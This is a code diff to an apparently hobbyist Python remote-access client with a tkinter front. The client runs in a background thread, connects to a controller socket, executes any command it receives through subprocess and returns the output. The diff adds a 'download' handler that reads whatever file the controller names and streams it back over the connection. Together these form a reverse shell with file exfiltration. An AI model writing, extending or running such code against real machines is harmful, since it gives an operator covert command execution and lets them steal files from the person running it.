@@ -2,6 +2,8 @@ import socket
 import threading
 import tkinter as tk
 import subprocess
+import os
+import time
 
 
 HOST=socket.gethostbyname(socket.gethostname())
@@ -23,6 +25,25 @@ def run_command(command:str):
 
 
 
+def downloading_a_file(_request:str):
+    words=_request.split()
+    print(words[1])
+    file=open(words[1],"rb")
+   # length=len('client_'+words[1])
+    print('client_'+words[1])
+    name='client_'+words[1]
+    #client.send(str(length).encode())
+    client.send(name.encode())
+    time.sleep(1)
+    data=file.read()
+    client.sendall(data)
+    print("data sent")
+    client.send(b"<END>")
+    print("the code sent")
+    file.close()
+
+
+
 
 def background():
     client.connect((HOST,PORT))
@@ -30,8 +51,11 @@ def background():
     while True:
         request=client.recv(1024).decode('UTF-8')
         print(request)
-        output=run_command(request)
-        client.sendall(output.encode('UTF-8'))
+        if 'download' in request:
+            downloading_a_file(request)
+        else:
+            output=run_command(request)
+            client.sendall(output.encode('UTF-8'))
 
         
 
